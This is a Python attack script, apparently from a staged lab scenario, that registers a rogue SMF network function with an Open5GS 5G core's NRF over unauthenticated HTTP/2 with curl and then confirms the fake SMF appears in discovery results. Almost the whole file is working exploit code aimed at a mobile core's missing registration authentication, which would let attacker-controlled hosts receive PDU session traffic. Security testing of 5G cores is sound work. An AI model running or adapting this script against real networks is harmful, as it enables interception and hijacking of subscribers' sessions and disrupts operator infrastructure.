#!/usr/bin/env python3
"""
Stage 2a — Rogue NF Registration via NRF
Scenario 1: Core Infiltration

Note: Open5GS's SBI interface speaks HTTP/2 cleartext (h2c) only,
not HTTP/1.1. Python's `requests` library doesn't support this, so
we shell out to curl with --http2-prior-knowledge, which tells curl
to speak HTTP/2 immediately rather than trying to negotiate/upgrade
from HTTP/1.1 first.
"""

import subprocess
import json
import uuid

NRF_ADDRESS = "192.168.134.128"
NRF_PORT = 7777

rogue_nf_id = str(uuid.uuid4())
url = f"http://{NRF_ADDRESS}:{NRF_PORT}/nnrf-nfm/v1/nf-instances/{rogue_nf_id}"

nf_profile = {
    "nfInstanceId": rogue_nf_id,
    "nfType": "SMF",
    "nfStatus": "REGISTERED",
    "ipv4Addresses": ["192.168.134.130"],
    "nfServices": [
        {
            "serviceInstanceId": str(uuid.uuid4()),
            "serviceName": "nsmf-pdusession",
            "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
            "scheme": "http",
            "nfServiceStatus": "REGISTERED",
            "ipEndPoints": [
                {"ipv4Address": "192.168.134.130", "port": 7777}
            ]
        }
    ]
}

def curl_json(method, target_url, body=None, params=None):
    """Run curl with HTTP/2 prior-knowledge, return (status_code, response_text)."""
    cmd = ["curl", "-s", "-w", "\n%{http_code}", "--http2-prior-knowledge",
           "-X", method, target_url]
    if params:
        query = "&".join(f"{k}={v}" for k, v in params.items())
        cmd[-1] = f"{target_url}?{query}"
    if body is not None:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]

    result = subprocess.run(cmd, capture_output=True, text=True)
    output = result.stdout.strip()
    # curl's -w appended the status code as the last line, split it off
    *body_lines, status_code = output.rsplit("\n", 1)
    response_body = "\n".join(body_lines)
    return int(status_code), response_body

print(f"[*] Attempting to register rogue NF profile: {rogue_nf_id}")
print(f"[*] Target NRF: {url}")

status, body = curl_json("PUT", url, body=nf_profile)
print(f"[*] Response status: {status}")

if status in (200, 201):
    print("[+] SUCCESS: Rogue NF profile accepted with no authentication.")
    print(body)
else:
    print(f"[-] Registration rejected or failed. Body: {body}")

print("\n[*] Checking if rogue NF is discoverable...")
disc_url = f"http://{NRF_ADDRESS}:{NRF_PORT}/nnrf-disc/v1/nf-instances"
disc_status, disc_body = curl_json("GET", disc_url,
                                     params={"target-nf-type": "SMF", "requester-nf-type": "AMF"})

if disc_status == 200:
    instances = json.loads(disc_body).get("nfInstances", [])
    found = any(inst.get("nfInstanceId") == rogue_nf_id for inst in instances)
    if found:
        print("[+] SUCCESS: Rogue SMF is discoverable via NRF's own Discovery API.")
    else:
        print("[-] Rogue NF registered but not showing up in discovery results.")
else:
    print(f"[-] Discovery query failed: {disc_status} {disc_body}")
